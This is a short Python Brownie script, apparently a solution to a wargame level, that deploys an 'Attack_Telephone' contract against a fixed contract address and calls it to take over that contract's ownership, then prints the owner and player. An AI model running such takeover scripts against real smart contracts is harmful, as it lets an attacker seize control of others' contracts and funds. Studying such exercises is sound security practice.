from brownie import accounts, config, interface ,network, Attack_Telephone

def main():
    network.priority_fee('5 gwei')
    contract_instance = '0x760D15D4293F6018EbAB32F785Ca16C6B907685A'
    player = accounts.add(config['wallets']['from_key'])
    attacker_contract = Attack_Telephone.deploy(contract_instance,{'from':player})

    attack_interface = interface.Iattack_telephone(attacker_contract.address)
    telphone_interface = interface.Itelephone(contract_instance)

   
    attacker_contract.change({'from':player}) 

    # There is a change of state in contract so need {'from':player})
    attack_interface.change({'from':player}) 
    owner = telphone_interface.owner()
    print('Player is ', player)
    print('Owner is',owner)


